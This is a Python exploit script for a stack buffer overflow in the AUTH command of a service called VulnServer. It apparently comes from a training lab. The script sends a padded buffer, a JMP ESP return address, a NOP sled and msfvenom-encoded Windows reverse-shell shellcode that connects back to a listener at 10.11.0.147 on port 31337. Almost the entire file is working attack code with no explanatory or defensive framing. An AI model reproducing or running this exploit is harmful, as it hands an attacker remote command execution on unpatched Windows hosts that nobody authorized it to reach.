#!/usr/bin/python
import time, struct, sys
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  rhost = sys.argv[1]
  rport = 5555
except IndexError:
  print "[+] Usage %s host" % sys.argv[0]
  sys.exit()

###
# Platform: windows
# Arch: x86
# Type: windows/shell_reverse_tcp
# LPORT: 31337
# LHOST: 10.11.???.????
# Encoder: x86/shikata_ga_nai
# Badchars: \x00 
# EXITFUNC: thread
# 
# Command: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f c -o shellcode.c LPORT=31337 LHOST=10.11.0.147 EXITFUNC=thread -b "\x00"
##
shellcode = (
"\xba\xbb\xd5\x60\x36\xda\xdc\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xed\xdb\x82\xc3\xed\x0c\xc0"
"\x2c\x0d\xcd\xa5\xa5\xe8\xfc\xe5\xd2\x79\xae\xd5\x91\x2f\x43"
"\x9d\xf4\xdb\xd0\xd3\xd0\xec\x51\x59\x07\xc3\x62\xf2\x7b\x42"
"\xe1\x09\xa8\xa4\xd8\xc1\xbd\xa5\x1d\x3f\x4f\xf7\xf6\x4b\xe2"
"\xe7\x73\x01\x3f\x8c\xc8\x87\x47\x71\x98\xa6\x66\x24\x92\xf0"
"\xa8\xc7\x77\x89\xe0\xdf\x94\xb4\xbb\x54\x6e\x42\x3a\xbc\xbe"
"\xab\x91\x81\x0e\x5e\xeb\xc6\xa9\x81\x9e\x3e\xca\x3c\x99\x85"
"\xb0\x9a\x2c\x1d\x12\x68\x96\xf9\xa2\xbd\x41\x8a\xa9\x0a\x05"
"\xd4\xad\x8d\xca\x6f\xc9\x06\xed\xbf\x5b\x5c\xca\x1b\x07\x06"
"\x73\x3a\xed\xe9\x8c\x5c\x4e\x55\x29\x17\x63\x82\x40\x7a\xec"
"\x67\x69\x84\xec\xef\xfa\xf7\xde\xb0\x50\x9f\x52\x38\x7f\x58"
"\x94\x13\xc7\xf6\x6b\x9c\x38\xdf\xaf\xc8\x68\x77\x19\x71\xe3"
"\x87\xa6\xa4\xa4\xd7\x08\x17\x05\x87\xe8\xc7\xed\xcd\xe6\x38"
"\x0d\xee\x2c\x51\xa4\x15\xa7\x54\x32\x15\xa4\x01\x46\x15\xb0"
"\xb8\xcf\xf3\x2e\x2b\x86\xac\xc6\xd2\x83\x26\x76\x1a\x1e\x43"
"\xb8\x90\xad\xb4\x77\x51\xdb\xa6\xe0\x91\x96\x94\xa7\xae\x0c"
"\xb0\x24\x3c\xcb\x40\x22\x5d\x44\x17\x63\x93\x9d\xfd\x99\x8a"
"\x37\xe3\x63\x4a\x7f\xa7\xbf\xaf\x7e\x26\x4d\x8b\xa4\x38\x8b"
"\x14\xe1\x6c\x43\x43\xbf\xda\x25\x3d\x71\xb4\xff\x92\xdb\x50"
"\x79\xd9\xdb\x26\x86\x34\xaa\xc6\x37\xe1\xeb\xf9\xf8\x65\xfc"
"\x82\xe4\x15\x03\x59\xad\x36\xe6\x4b\xd8\xde\xbf\x1e\x61\x83"
"\x3f\xf5\xa6\xba\xc3\xff\x56\x39\xdb\x8a\x53\x05\x5b\x67\x2e"
"\x16\x0e\x87\x9d\x17\x1b")

# 77D3E871   FFE4             JMP ESP
buffer = ""
buffer += "\x41"*1040
buffer += struct.pack("<L", 0x77d3e871)
buffer += "\x90"*16
buffer += shellcode

try:
  print "[*] Simple VulnServer exploit"
  print "[*] Send %s bytes" % len(buffer) 
  s.connect((rhost, rport))
  print repr(s.recv(1024))
  time.sleep(2)
  s.send('AUTH ' + buffer +'\r\n')
  print repr(s.recv(1024))
  print "[*] Down!"
except:
  print "[!] connection refused, check debugger"
s.close()
